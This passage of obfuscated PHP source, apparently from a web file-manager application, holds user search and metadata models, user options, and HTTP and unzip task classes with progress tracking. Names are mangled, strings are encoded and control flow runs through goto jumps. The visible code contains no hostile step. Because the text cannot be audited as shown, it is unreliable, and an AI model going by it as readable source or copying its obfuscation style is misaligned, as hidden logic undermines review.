$E¨‹±œæ• . "\x75\163\145\x72\56{$c‚†ÛİéÁ¤}\x20{$aõá´‹ãÓ÷}\x2c\x20\165\x73\145\162\x2e\x75\163\145\x72\x49\104\40\x61\x73\143"; return $this->alias($AÌ•¦ƒ…İ[2233])->order($E¨‹±œæ•); goto B† œóÈ‡ª; E˜ÖÛ‹­¢¿: $c‚†ÛİéÁ¤ = Input::get($AÌ•¦ƒ…İ[403], $AÌ•¦ƒ…İ[7], $AÌ•¦ƒ…İ[1400], $EæÏ¯‹åŸ…); $aõá´‹ãÓ÷ = Input::get($AÌ•¦ƒ…İ[404], $AÌ•¦ƒ…İ[7], $AÌ•¦ƒ…İ[2147], array($AÌ•¦ƒ…İ[2147], $AÌ•¦ƒ…İ[400])); $aõá´‹ãÓ÷ = $C‡†˜Ú¿‹é[$aõá´‹ãÓ÷]; goto A‘îó’İÔ³; d¹Ñ†’ç×†: $AÌ•¦ƒ…İ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $EæÏ¯‹åŸ… = array($AÌ•¦ƒ…İ[1409], $AÌ•¦ƒ…İ[28], $AÌ•¦ƒ…İ[2058], $AÌ•¦ƒ…İ[2031], $AÌ•¦ƒ…İ[184]); $C‡†˜Ú¿‹é = array($AÌ•¦ƒ…İ[398] => $AÌ•¦ƒ…İ[399], $AÌ•¦ƒ…İ[400] => $AÌ•¦ƒ…İ[401]); goto E˜ÖÛ‹­¢¿; B† œóÈ‡ª: } public function listSearch($bŞø¶¼ğÒ) { goto CŒ‡ïİ´Œå; fò„ƒòË‘ª: return $E‘ää„ÕÏâ; goto A¹îÇÅ‹„; CÎ›ª’ØŒò: if (!$fñèÊÎ…) { $dˆÌÉ–ùœó = array(); } if (isset($bŞø¶¼ğÒ[$F®Ù·ìÉĞö[684]])) { $dˆÌÉ–ùœó[$F®Ù·ìÉĞö[684]] = $bŞø¶¼ğÒ[$F®Ù·ìÉĞö[684]]; } $E‘ää„ÕÏâ = $this->_makeOrder()->where($dˆÌÉ–ùœó)->selectPage(20); goto Eè…Çô¹; cÉ÷Ú¸Šìµ: $fñèÊÎ… = str_replace($F®Ù·ìÉĞö[2150], $F®Ù·ìÉĞö[2151], trim($fñèÊÎ…)); $dˆÌÉ–ùœó = array($F®Ù·ìÉĞö[28] => array($F®Ù·ìÉĞö[746], "\x25{$fñèÊÎ…}\45"), $F®Ù·ìÉĞö[290] => array($F®Ù·ìÉĞö[746], "\45{$fñèÊÎ…}\45"), $F®Ù·ìÉĞö[2292] => array($F®Ù·ìÉĞö[746], "\x25{$fñèÊÎ…}\45"), $F®Ù·ìÉĞö[908] => $F®Ù·ìÉĞö[2152]); if (Input::check($fñèÊÎ…, $F®Ù·ìÉĞö[296])) { $dˆÌÉ–ùœó[$F®Ù·ìÉĞö[1409]] = array($F®Ù·ìÉĞö[746], "\x25{$fñèÊÎ…}\45"); $dˆÌÉ–ùœó[$F®Ù·ìÉĞö[2468]] = array($F®Ù·ìÉĞö[746], "\45{$fñèÊÎ…}\x25"); } goto CÎ›ª’ØŒò; CŒ‡ïİ´Œå: $F®Ù·ìÉĞö =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $fñèÊÎ… = $bŞø¶¼ğÒ[$F®Ù·ìÉĞö[2148]]; $CÚé¾Ë»‘ğ = isset($bŞø¶¼ğÒ[$F®Ù·ìÉĞö[2149]]) ? $bŞø¶¼ğÒ[$F®Ù·ìÉĞö[2149]] : !1; goto cÉ÷Ú¸Šìµ; Eè…Çô¹: if (!$E‘ää„ÕÏâ || count($E‘ää„ÕÏâ[$F®Ù·ìÉĞö[351]]) < 5 && Input::check($fñèÊÎ…, $F®Ù·ìÉĞö[303])) { $F‚®»Úß = $this->_searchFromMeta($F®Ù·ìÉĞö[411], $fñèÊÎ…, 10); $A”Ê‹ˆòÚ³ = $this->_searchFromMeta($F®Ù·ìÉĞö[412], $fñèÊÎ…, 10); $fø»ÙÈµí‹ = array_merge($F‚®»Úß, $A”Ê‹ˆòÚ³, $E‘ää„ÕÏâ[$F®Ù·ìÉĞö[351]]); $E‘ää„ÕÏâ[$F®Ù·ìÉĞö[351]] = array_unique_by_key($fø»ÙÈµí‹, $F®Ù·ìÉĞö[1409]); $E‘ää„ÕÏâ[$F®Ù·ìÉĞö[348]][$F®Ù·ìÉĞö[349]] = count($E‘ää„ÕÏâ[$F®Ù·ìÉĞö[351]]); $E‘ää„ÕÏâ[$F®Ù·ìÉĞö[348]][$F®Ù·ìÉĞö[350]] = ceil($E‘ää„ÕÏâ[$F®Ù·ìÉĞö[348]][$F®Ù·ìÉĞö[349]] / $E‘ää„ÕÏâ[$F®Ù·ìÉĞö[348]][$F®Ù·ìÉĞö[346]]); } $this->_listDataApply($E‘ää„ÕÏâ[$F®Ù·ìÉĞö[351]]); $this->_filterByGroup($E‘ää„ÕÏâ, $CÚé¾Ë»‘ğ); goto fò„ƒòË‘ª; A¹îÇÅ‹„: } private function _filterByGroup(&$fÅ­¯¸¿, $D¨‚ŸšÇİå) { $a‰«åŒ•¢º =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!$D¨‚ŸšÇİå) { return $fÅ­¯¸¿; } foreach ($fÅ­¯¸¿[$a‰«åŒ•¢º[351]] as $dÊŸ¿»ŠÈ => &$bğ±œâñè˜) { $A‚ô¡÷ò•‹ = array_to_keyvalue($bğ±œâñè˜[$a‰«åŒ•¢º[2489]], $a‰«åŒ•¢º[33], $a‰«åŒ•¢º[2072]); if (!in_array($D¨‚ŸšÇİå, $A‚ô¡÷ò•‹)) { unset($fÅ­¯¸¿[$a‰«åŒ•¢º[351]][$dÊŸ¿»ŠÈ]); } } $fÅ­¯¸¿[$a‰«åŒ•¢º[351]] = array_values($fÅ­¯¸¿[$a‰«åŒ•¢º[351]]); $fÅ­¯¸¿[$a‰«åŒ•¢º[348]] = array($a‰«åŒ•¢º[2267] => count($fÅ­¯¸¿[$a‰«åŒ•¢º[351]]), $a‰«åŒ•¢º[2265] => $fÅ­¯¸¿[$a‰«åŒ•¢º[348]][$a‰«åŒ•¢º[346]], $a‰«åŒ•¢º[2264] => 1, $a‰«åŒ•¢º[2266] => 1); } private function _searchFromMeta($aËİ‚ñ¶‹, $e‹³˜î¢Á, $aÍ‰Ó·¶¥™) { goto a¿ÂÆ›ë¤Ç; Aç§ÂÃÕÊì: $b‹ÃºÓ…Â = Model($DéÈˆ°ñ‚[2490])->where($c­¢‹Ş±‚ì)->limit($aÍ‰Ó·¶¥™)->select(); if (!$b‹ÃºÓ…Â) { return array(); } $b‹ÃºÓ…Â = array_to_keyvalue($b‹ÃºÓ…Â, $DéÈˆ°ñ‚[33], $DéÈˆ°ñ‚[1409]); goto E×®Ğ»’¤È; E×®Ğ»’¤È: $B£©‘²¬Ì = $this->where(array($DéÈˆ°ñ‚[1400] => array($DéÈˆ°ñ‚[7], $b‹ÃºÓ…Â)))->select(); if (!$B£©‘²¬Ì) { return array(); } return $B£©‘²¬Ì; goto a„­‡òƒ; a¿ÂÆ›ë¤Ç: $DéÈˆ°ñ‚ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $e‹³˜î¢Á = strtolower($e‹³˜î¢Á); $c­¢‹Ş±‚ì = array($DéÈˆ°ñ‚[89] => $aËİ‚ñ¶‹, $DéÈˆ°ñ‚[356] => array($DéÈˆ°ñ‚[746], "\x25{$e‹³˜î¢Á}\x25")); goto Aç§ÂÃÕÊì; a„­‡òƒ: } private function _listDataApplyItem($BØŸÏšÄ¤å) { $Bñ£áª°Ñ— = array($BØŸÏšÄ¤å); $this->_listDataApply($Bñ£áª°Ñ—); return $Bñ£áª°Ñ—[0]; } private function _listDataApply(&$FÂ·ä¨”·) { goto Aù½ÒŒôƒ; cœÙççÁ®ï: $this->_listAppendSourceRoot($FÂ·ä¨”·, $cìÄŸƒ’œ); goto E‘ÖœğÈ“³; Aù½ÒŒôƒ: $c¼ä’Á”¦Ë =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!$FÂ·ä¨”·) { return; } array_remove_key($FÂ·ä¨”·, $c¼ä’Á”¦Ë[796]); goto aÓº‡¥Ş™; aÓº‡¥Ş™: $cìÄŸƒ’œ = array_to_keyvalue($FÂ·ä¨”·, $c¼ä’Á”¦Ë[33], $c¼ä’Á”¦Ë[1409]); $this->_listAppendGroup($FÂ·ä¨”·, $cìÄŸƒ’œ); $this->_listAppendMeta($FÂ·ä¨”·, $cìÄŸƒ’œ); goto cœÙççÁ®ï; E‘ÖœğÈ“³: } private function _listAppendSourceRoot(&$DÔöîùÚÄ·, $B‘½„‡Ó‡) { goto F™¿í“îŸÄ; Dó’†ØŒÎ¬: foreach ($DÔöîùÚÄ· as &$FÊ‡ğÍ†) { $FÊ‡ğÍ†[$Dæ†¨Ë£”Š[388]] = $f–œ Óè[$FÊ‡ğÍ†[$Dæ†¨Ë£”Š[1409]]] ? $f–œ Óè[$FÊ‡ğÍ†[$Dæ†¨Ë£”Š[1409]]] : array(); } goto fœãÙ¿¥°Ó; BîË«Ã: $f–œ Óè = Model($Dæ†¨Ë£”Š[747])->order($Dæ†¨Ë£”Š[2159])->field($e§ƒšœÇŸ)->where($cÅÓã‹–èà)->select(); $f–œ Óè = array_to_keyvalue($f–œ Óè, $Dæ†¨Ë£”Š[452]); $f–œ Óè = array_remove_key($f–œ Óè, $Dæ†¨Ë£”Š[452]); goto Dó’†ØŒÎ¬; F™¿í“îŸÄ: $Dæ†¨Ë£”Š =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $cÅÓã‹–èà = array($Dæ†¨Ë£”Š[457] => 0, $Dæ†¨Ë£”Š[368] => SourceModel::TYPE_USER, $Dæ†¨Ë£”Š[452] => array($Dæ†¨Ë£”Š[7], $B‘½„‡Ó‡)); $e§ƒšœÇŸ = $Dæ†¨Ë£”Š[2158]; goto BîË«Ã; fœãÙ¿¥°Ó: } private function _listAppendGroup(&$a‹œ¤å¥Ë£, $F¥ùö¦Å¹…) { goto C®áªÅ–™Ç; A¶åˆ‰¨†ï: $fìÎ‰Á½ƒ = array_to_keyvalue($b­àßÜß‡ª, $a…‚­‡ù²‹[33], $a…‚­‡ù²‹[2072]); $fìÎ‰Á½ƒ = array_remove_value(array_unique($fìÎ‰Á½ƒ), $a…‚­‡ù²‹[464]); if (!$fìÎ‰Á½ƒ || !$b­àßÜß‡ª) { return; } goto eÉ¬»²µñî; eÉ¬»²µñî: $B®‡àí´«Í = array($a…‚­‡ù²‹[2072] => array($a…‚­‡ù²‹[7], $fìÎ‰Á½ƒ)); $a„çÌğ¶† = Model($a…‚­‡ù²‹[2491])->field($a…‚­‡ù²‹[2492])->where($B®‡àí´«Í)->select(); $AÊ¢—¡„Å = array_to_keyvalue($a„çÌğ¶†, $a…‚­‡ù²‹[2072], $a…‚­‡ù²‹[28]); goto fàÄ¬Ã¨; fàÄ¬Ã¨: $b­àßÜß‡ª = array_to_keyvalue_group($b­àßÜß‡ª, $a…‚­‡ù²‹[1409]); foreach ($b­àßÜß‡ª as &$AÕê­õø³Í) { $C©Ì›Ş¼Ü« = array(); foreach ($AÕê­õø³Í as $b¯‹İ‡ÑµÎ) { if (!$b¯‹İ‡ÑµÎ[$a…‚­‡ù²‹[2200]]) { continue; } $B¦£—šæë· = Model($a…‚­‡ù²‹[2219])->listData($b¯‹İ‡ÑµÎ[$a…‚­‡ù²‹[2200]]); $C©Ì›Ş¼Ü«[] = array($a…‚­‡ù²‹[2072] => $b¯‹İ‡ÑµÎ[$a…‚­‡ù²‹[2072]], $a…‚­‡ù²‹[2493] => $AÊ¢—¡„Å[$b¯‹İ‡ÑµÎ[$a…‚­‡ù²‹[2072]]], $a…‚­‡ù²‹[373] => $B¦£—šæë·); } $AÕê­õø³Í = $C©Ì›Ş¼Ü«; } foreach ($a‹œ¤å¥Ë£ as &$b÷…è´ÂÍª) { $b÷…è´ÂÍª[$a…‚­‡ù²‹[2489]] = array(); if (isset($b­àßÜß‡ª[$b÷…è´ÂÍª[$a…‚­‡ù²‹[1409]]])) { $b÷…è´ÂÍª[$a…‚­‡ù²‹[2489]] = $b­àßÜß‡ª[$b÷…è´ÂÍª[$a…‚­‡ù²‹[1409]]]; } } goto B‡ğå¨ î; C®áªÅ–™Ç: $a…‚­‡ù²‹ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $B®‡àí´«Í = array($a…‚­‡ù²‹[1409] => array($a…‚­‡ù²‹[7], $F¥ùö¦Å¹…)); $b­àßÜß‡ª = Model($a…‚­‡ù²‹[2146])->where($B®‡àí´«Í)->select(); goto A¶åˆ‰¨†ï; B‡ğå¨ î: } private function _listAppendMeta(&$C¸øçæ‡¿©, $AØ…ÉåîºÃ) { goto F§„ˆÉ’Ê; dÚ°¸èÇÇÄ: $aˆÜ²°©– = array($aë•¶÷¡×‰[1409] => array($aë•¶÷¡×‰[7], $AØ…ÉåîºÃ)); $e¶ÏĞ¨¥Š = Model($aë•¶÷¡×‰[2467])->where($aˆÜ²°©–)->select(); $e¶ÏĞ¨¥Š = array_to_keyvalue_group($e¶ÏĞ¨¥Š, $aë•¶÷¡×‰[1409]); goto dÂ‡‘ÜÓÔ; F§„ˆÉ’Ê: $aë•¶÷¡×‰ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $DÇ†÷çÄ“Ù = UserJobModel::JOB_KEY; $EƒìÑÊÇ­ˆ = array($aë•¶÷¡×‰[2470]); goto dÚ°¸èÇÇÄ; dÂ‡‘ÜÓÔ: foreach ($e¶ÏĞ¨¥Š as &$CóßÕÍÆæ‘) { $FµÌ‡¯—šÈ = array(); foreach ($CóßÕÍÆæ‘ as $d¾Æó”™İÇ) { if (!in_array($d¾Æó”™İÇ[$aë•¶÷¡×‰[89]], $EƒìÑÊÇ­ˆ)) { $FµÌ‡¯—šÈ[$d¾Æó”™İÇ[$aë•¶÷¡×‰[89]]] = $d¾Æó”™İÇ[$aë•¶÷¡×‰[356]]; } } $CóßÕÍÆæ‘ = $FµÌ‡¯—šÈ; } $C‰£ïÔ­ÅÒ = Model($aë•¶÷¡×‰[2494]); foreach ($C¸øçæ‡¿© as &$B‹ùë¾‰Ú¨) { $Fë÷´ŸŒé = array(); if (isset($e¶ÏĞ¨¥Š[$B‹ùë¾‰Ú¨[$aë•¶÷¡×‰[1409]]])) { $Fë÷´ŸŒé = $e¶ÏĞ¨¥Š[$B‹ùë¾‰Ú¨[$aë•¶÷¡×‰[1409]]]; } $B‹ùë¾‰Ú¨[$aë•¶÷¡×‰[2495]] = array(); if (isset($Fë÷´ŸŒé[$DÇ†÷çÄ“Ù])) { $B‹ùë¾‰Ú¨[$aë•¶÷¡×‰[2495]] = $C‰£ïÔ­ÅÒ->getUserJobInfo($Fë÷´ŸŒé[$DÇ†÷çÄ“Ù]); } } goto eñî‹›‚’; eñî‹›‚’: } public function userSearch($AÚ½¯¥Ô, $C÷«õÚƒ = "\x2a") { return Model($_SERVER[ÚŠ•´ÍéÒÑÔ][473])->where($AÚ½¯¥Ô)->field($C÷«õÚƒ)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\163\x65\x72\137\157\160\164\151\x6f\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($fï÷¥á©„Ä) { $B†à´ÔßÏö =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!defined($B†à´ÔßÏö[423])) { define($B†à´ÔßÏö[423], 0); } return "\x55\x73\x65\162\117\160\164\x69\x6f\x6e\137{$fï÷¥á©„Ä}\x5f" . USER_ID; } protected function filterWhere($dƒËìÜ©í§) { $CÃËÓ†‘Õ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!defined($CÃËÓ†‘Õ[423])) { define($CÃËÓ†‘Õ[423], 0); } $dƒËìÜ©í§[$CÃËÓ†‘Õ[1409]] = USER_ID; return $dƒËìÜ©í§; } public function cacheRemoveUser($fÊ„…“•¹, $E²ŒÁ¡¶Ì) { return Cache::remove("\x55\163\145\x72\117\x70\164\x69\x6f\x6e\x5f{$fÊ„…“•¹}\x5f" . $E²ŒÁ¡¶Ì); } protected function optionDefault($BÂ„ÔÉÎÛç = '') { $a›²£ï¬ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if ($BÂ„ÔÉÎÛç == $a›²£ï¬[33]) { return $GLOBALS[$a›²£ï¬[6]][$a›²£ï¬[2496]]; } if ($BÂ„ÔÉÎÛç == $a›²£ï¬[2497]) { return $GLOBALS[$a›²£ï¬[6]][$a›²£ï¬[2498]]; } } } goto aŒ§’§óò»; eÒ†„ÚèÏ³: class TaskHttp extends Task { protected function startAfter() { $D­Üø·‚¡ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; Hook::bind($D­Üø·‚¡[1446], array($this, $D­Üø·‚¡[1469])); Hook::bind($D­Üø·‚¡[1448], array($this, $D­Üø·‚¡[1470])); Hook::bind($D­Üø·‚¡[1450], array($this, $D­Üø·‚¡[1471])); } protected function endAfter() { $aÊ»„«îº÷ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; Hook::unbind($aÊ»„«îº÷[1446], array($this, $aÊ»„«îº÷[1469])); Hook::unbind($aÊ»„«îº÷[1448], array($this, $aÊ»„«îº÷[1470])); Hook::unbind($aÊ»„«îº÷[1450], array($this, $aÊ»„«îº÷[1471])); } public function progressStart($F”ì¤¬À»ˆ) { $C‹¬ÑÈšÛó =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $DÖÜ¯Ê£‚Œ = curl_getinfo($F”ì¤¬À»ˆ); self::log($C‹¬ÑÈšÛó[1472] . $DÖÜ¯Ê£‚Œ[$C‹¬ÑÈšÛó[292]]); self::valueSet($this->task[$C‹¬ÑÈšÛó[364]], $this->task); } public function progressEnd($fÌÚ–¸¦…«) { $dò½…ŒË« =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; self::log($dò½…ŒË«[1473] . $this->task[$dò½…ŒË«[364]]); $this->end(); } public function progress($a“Éè‘öÎÃ, $dÕ¸“ÉäÈî, $Aº²Èöí°, $cöê¥ïØø, $EééŒğà²Æ) { $DŸË‹Üù ğ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $F¬ƒĞ™š÷ =& $this->task; if ($EééŒğà²Æ > 0) { $F¬ƒĞ™š÷[$DŸË‹Üù ğ[970]] = $F¬ƒĞ™š÷[$DŸË‹Üù ğ[970]] == 0 ? $cöê¥ïØø : $F¬ƒĞ™š÷[$DŸË‹Üù ğ[970]]; $F¬ƒĞ™š÷[$DŸË‹Üù ğ[982]] = $EééŒğà²Æ; } else { if ($Aº²Èöí° > 0) { $F¬ƒĞ™š÷[$DŸË‹Üù ğ[970]] = $F¬ƒĞ™š÷[$DŸË‹Üù ğ[970]] == 0 ? $dÕ¸“ÉäÈî : $F¬ƒĞ™š÷[$DŸË‹Üù ğ[970]]; $F¬ƒĞ™š÷[$DŸË‹Üù ğ[982]] = $Aº²Èöí°; } } $this->update(); self::log("\x70\x72\157\x67\x72\145\x73\x73\x48\164\x74\160\x3a\144\157\167\156\72{$Aº²Èöí°}\57{$dÕ¸“ÉäÈî}\x3b\40\165\160\154\x6f\x61\144\72{$EééŒğà²Æ}\x2f{$cöê¥ïØø}\73"); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto F„êÄã¹• ; d“Ø¤¹ƒ‹Ş: Hook::bind($báË®”†[1027], array($this, $báË®”†[1476])); $b´ŒÇÉĞã =& $this->task; $b´ŒÇÉĞã[$báË®”†[1477]] = $báË®”†[1032]; goto a¹ŠåÆí±Ø; F„êÄã¹• : $báË®”† =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; parent::startAfter(); Hook::bind($báË®”†[1474], array($this, $báË®”†[1475])); goto d“Ø¤¹ƒ‹Ş; a¹ŠåÆí±Ø: if (!$b´ŒÇÉĞã[$báË®”†[1316]]) { $b´ŒÇÉĞã[$báË®”†[1316]] = LNG($báË®”†[1478]); } goto dÏÙ¸Ğß¶†; dÏÙ¸Ğß¶†: } protected function endAfter() { $eËÀ‰êÈ…â =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; parent::endAfter(); Hook::unbind($eËÀ‰êÈ…â[1474], array($this, $eËÀ‰êÈ…â[1475])); Hook::unbind($eËÀ‰êÈ…â[1027], array($this, $eËÀ‰êÈ…â[1476])); } public function updateAfter() { $f”ÑóÍ¢ùù =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $F¤ßğ§­‘ =& $this->task; if (!$F¤ßğ§­‘[$f”ÑóÍ¢ùù[970]] || !$F¤ßğ§­‘[$f”ÑóÍ¢ùù[693]]) { return; } if ($F¤ßğ§­‘[$f”ÑóÍ¢ùù[1477]] == $f”ÑóÍ¢ùù[1032]) { $e¬¦È‘á = 0; if ($F¤ßğ§­‘[$f”ÑóÍ¢ùù[1454]]) { $e¬¦È‘á = $F¤ßğ§­‘[$f”ÑóÍ¢ùù[1455]] / $F¤ßğ§­‘[$f”ÑóÍ¢ùù[1454]]; } $F¤ßğ§­‘[$f”ÑóÍ¢ùù[1410]] = $e¬¦È‘á * 0.3; } else { if ($F¤ßğ§­‘[$f”ÑóÍ¢ùù[1477]] == $f”ÑóÍ¢ùù[298]) { $e¬¦È‘á = $F¤ßğ§­‘[$f”ÑóÍ¢ùù[982]] / $F¤ßğ§­‘[$f”ÑóÍ¢ùù[970]]; $F¤ßğ§­‘[$f”ÑóÍ¢ùù[1410]] = 0.3 + $e¬¦È‘á * 0.4; } else { if ($F¤ßğ§­‘[$f”ÑóÍ¢ùù[1477]] == $f”ÑóÍ¢ùù[91]) { $e´ö­Òè”¯ = 0; if ($F¤ßğ§­‘[$f”ÑóÍ¢ùù[1456]] == $f”ÑóÍ¢ùù[91]) { $e´ö­Òè”¯ = $F¤ßğ§­‘[$f”ÑóÍ¢ùù[1455]]; } $e¬¦È‘á = ($F¤ßğ§­‘[$f”ÑóÍ¢ùù[1459]] + $e´ö­Òè”¯) / $F¤ßğ§­‘[$f”ÑóÍ¢ùù[693]]; $F¤ßğ§­‘[$f”ÑóÍ¢ùù[1410]] = 0.3 + 0.4 + $e¬¦È‘á * 0.3; } } } if ($F¤ßğ§­‘[$f”ÑóÍ¢ùù[1410]] > 0) { $aù¤Å™òˆµ = timeFloat() - $F¤ßğ§­‘[$f”ÑóÍ¢ùù[1412]] - $F¤ßğ§­‘[$f”ÑóÍ¢ùù[1415]]; $F¤ßğ§­‘[$f”ÑóÍ¢ùù[1416]] = $aù¤Å™òˆµ * (1 - $F¤ßğ§­‘[$f”ÑóÍ¢ùù[1410]]) / $F¤ßğ§­‘[$f”ÑóÍ¢ùù[1410]]; } } public function addFile($AˆÉ½“õ×) { goto bˆßñ­ïœ¬; FŞ¸ù Îåß: $CåÏµŒ´òš[$Cî‚Ã“¿æ–[1452]] = $aÚˆˆ‘È[$Cî‚Ã“¿æ–[28]]; $CåÏµŒ´òš[$Cî‚Ã“¿æ–[1454]] = $aÚˆˆ‘È[$Cî‚Ã“¿æ–[77]]; $CåÏµŒ´òš[$Cî‚Ã“¿æ–[1455]] = 0; goto c¦äì¾äÈô; c¦äì¾äÈô: $CåÏµŒ´òš[$Cî‚Ã“¿æ–[972]] = $Cî‚Ã“¿æ–[1467]; $CåÏµŒ´òš[$Cî‚Ã“¿æ–[1456]] = $Cî‚Ã“¿æ–[1032]; $CåÏµŒ´òš[$Cî‚Ã“¿æ–[693]] = $aÚˆˆ‘È[$Cî‚Ã“¿æ–[77]]; goto CÂàÇóÂ½; CÂàÇóÂ½: $CåÏµŒ´òš[$Cî‚Ã“¿æ–[970]] = 1; $aİÉ´®àÓ = 0; $CåÏµŒ´òš[$Cî‚Ã“¿æ–[1460]] = array($Cî‚Ã“¿æ–[1461] => $aİÉ´®àÓ + 1, $Cî‚Ã“¿æ–[383] => $aÚˆˆ‘È[$Cî‚Ã“¿æ–[28]], $Cî‚Ã“¿æ–[75] => $aÚˆˆ‘È[$Cî‚Ã“¿æ–[75]], $Cî‚Ã“¿æ–[462] => $aÚˆˆ‘È[$Cî‚Ã“¿æ–[462]] ? $aÚˆˆ‘È[$Cî‚Ã“¿æ–[462]] : $aÚˆˆ‘È[$Cî‚Ã“¿æ–[75]]); goto fÄ¤¥‘Ü†–; bˆßñ­ïœ¬: $Cî‚Ã“¿æ– =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $CåÏµŒ´òš =& $this->task; $aÚˆˆ‘È = IO::info($AˆÉ½“õ×); goto FŞ¸ù Îåß; fÄ¤¥‘Ü†–: $this->update(); goto dòŒ™Üï¾†; dòŒ™Üï¾†: } public function unzipAfter($cÊí××ùùË) { goto FÏ¶Ğáªæ; CšÔÄ®ƒîœ: $this->update(); self::log($CØ“‹¼ªŞ¤[1479] . json_encode(array($BØİÜ¡¢„–, $f«°Óä—))); goto Aƒƒ¡¿šÖ‰; FÏ¶Ğáªæ: $CØ“‹¼ªŞ¤ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $BØİÜ¡¢„– =& $this->task; $BØİÜ¡¢„–[$CØ“‹¼ªŞ¤[1477]] = $CØ“‹¼ªŞ¤[91]; goto A¼ª˜öÓ‡Û; F­Ü¿¤ÅÅÖ: if ($f«°Óä—[$CØ“‹¼ªŞ¤[29]] == $CØ“‹¼ªŞ¤[164]) { $BØİÜ¡¢„–[$CØ“‹¼ªŞ¤[970]] = 1; } else { $BØİÜ¡¢„–[$CØ“‹¼ªŞ¤[970]] = $f«°Óä—[$CØ“‹¼ªŞ¤[80]][$CØ“‹¼ªŞ¤[78]]; } $BØİÜ¡¢„–[$CØ“‹¼ªŞ¤[972]] = $CØ“‹¼ªŞ¤[33]; $BØİÜ¡¢„–[$CØ“‹¼ªŞ¤[1456]] = 0; goto Añù›Ç•‹Ñ; Añù›Ç•‹Ñ: $BØİÜ¡¢„–[$CØ“‹¼ªŞ¤[982]] = 0; $BØİÜ¡¢„–[$CØ“‹¼ªŞ¤[1454]] = 0; $BØİÜ¡¢„–[$CØ“‹¼ªŞ¤[1455]] = 0; goto aË»‰ÚÙŒ; A¼ª˜öÓ‡Û: $f«°Óä— = IO::infoWithChildren($cÊí××ùùË); $e¡‚½±›Ô× = 0; $BØİÜ¡¢„–[$CØ“‹¼ªŞ¤[1460]] = array($CØ“‹¼ªŞ¤[1461] => $e¡‚½±›Ô× + 1, $CØ“‹¼ªŞ¤[383] => $f«°Óä—[$CØ“‹¼ªŞ¤[28]], $CØ“‹¼ªŞ¤[75] => $f«°Óä—[$CØ“‹¼ªŞ¤[75]], $CØ“‹¼ªŞ¤[462] => $f«°Óä—[$CØ“‹¼ªŞ¤[462]] ? $f«°Óä—[$CØ“‹¼ªŞ¤[462]] : $f«°Óä—[$CØ“‹¼ªŞ¤[75]]); goto F­Ü¿¤ÅÅÖ; aË»‰ÚÙŒ: $BØİÜ¡¢„–[$CØ“‹¼ªŞ¤[1452]] = $CØ“‹¼ªŞ¤[33]; $BØİÜ¡¢„–[$CØ“‹¼ªŞ¤[1459]] = 0; $BØİÜ¡¢„–[$CØ“‹¼ªŞ¤[693]] = $f«°Óä—[$CØ“‹¼ªŞ¤[77]]; goto CšÔÄ®ƒîœ; Aƒƒ¡¿šÖ‰: } public function nameParse($E÷Ğîƒ¨„‚) { goto f‹íªî§¨¾; f‹íªî§¨¾: $f§…Û‹Ä£â =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $FĞĞçŠ“ÊÛ =& $this->task; if ($FĞĞçŠ“ÊÛ[$f§…Û‹Ä£â[1477]] == $f§…Û‹Ä£â[1032]) { $FĞĞçŠ“ÊÛ[$f§…Û‹Ä£â[1477]] = $f§…Û‹Ä£â[298]; $FĞĞçŠ“ÊÛ[$f§…Û‹Ä£â[1459]] = 0; $FĞĞçŠ“ÊÛ[$f§…Û‹Ä£â[693]] = 0; } goto d‹–ß®¸ÒÇ; d‹–ß®¸ÒÇ: $D–¬Íğëˆ = get_path_this($E÷Ğîƒ¨„‚); if (strstr($D–¬Íğëˆ, $f§…Û‹Ä£â[93])) { $FĞĞçŠ“ÊÛ[$f§…Û‹Ä£â[982]] += 1; $FĞĞçŠ“ÊÛ[$f§…Û‹Ä£â[970]] += 1; } $FĞĞçŠ“ÊÛ[$f§…Û‹Ä£â[1452]] = $E÷Ğîƒ¨„‚; goto EÏ¿øÜË£; EÏ¿øÜË£: $this->update(); goto f¡ê¸Ö¹Ù‡; f¡ê¸Ö¹Ù‡: } } $aÙ©–ÎÙÈÊ = LIB_DIR . $_SERVER[ÚŠ•´ÍéÒÑÔ][1151]; goto e…Óò˜»èÉ; D½†¦…³­á: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\163\x65\162\137\x66\x61\166"; protected function cacheFunctionAlias($B¶Ö¥Í˜Ñ‚) { $DÁ¼š‡Ü„î =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; return array($DÁ¼š‡Ü„î[2443] => array(USER_ID, $DÁ¼š‡Ü„î[2499])); } protected function listData() { $e¨½ÚÆ‚Ãí =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $CÊ°ÊÒİŠØ = array($e¨½ÚÆ‚Ãí[1400] => USER_ID, $e¨½ÚÆ‚Ãí[432] => array($e¨½ÚÆ‚Ãí[2500], 0)); $f–õÛĞ’“ = $e¨½ÚÆ‚Ãí[2501]; $F÷ŸŒ»âÉ = $e¨½ÚÆ‚Ãí[2502]; $AŸè„Ø‚æ = $this->field($f–õÛĞ’“)->where($CÊ°ÊÒİŠØ)->order($F÷ŸŒ»âÉ)->select(); return $AŸè„Ø‚æ ? $AŸè„Ø‚æ : array(); } protected function listByTag($CáÒ¬‹‚ˆÚ) { } protected function addToTag($Dä…¬ë„‚â, $a·É¾¥Œ) { $eøçÉ¸¹•Ê =& 